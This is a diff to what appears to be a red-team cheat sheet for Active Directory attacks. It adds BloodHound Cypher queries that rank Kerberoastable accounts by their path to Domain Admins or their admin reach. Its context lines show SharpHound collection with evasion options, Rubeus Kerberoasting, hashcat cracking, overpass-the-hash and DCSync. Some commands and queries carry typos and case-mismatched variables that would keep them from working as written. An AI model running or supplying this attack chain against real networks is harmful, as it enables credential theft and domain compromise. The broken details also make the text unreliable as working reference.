@@ -6,6 +6,23 @@ GhostPack Tools
   SharpHound.exe -c All, Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
   Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
     Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
+    
+Bloodhound/Neo4J
+  # FIND SPN WITH DOMAIN ADMIN
+  MATCH (u:User {hasspn: true})
+  MATCH (G:Group {name: 'DOMAIN ADMINS@DOMAIN.COM'})
+  MATCH p = shortestPath ((u)-[*1..]->(g))
+  RETURN u.name,LENGTH(P)
+  ORDER BY LENGTH(p) ASC
+
+  # FIND SPN ORDER BY ADMIN ACCESS
+  MATCH (u: User {hasspn: true})
+  OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
+  OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
+  WITH u,COLLECT(c1) + COLLECT(c2) AS tempVar
+  UNWIND tempVar AS comps
+  RETURN u.name,COUNT(DISTINCT(comps))
+  ORDER BY COUNT(DISTINCT(comps)) DESC
 
 Overpass the Hash
   dcsync fqdn domain\user (User must have DCSync rights in that domain)
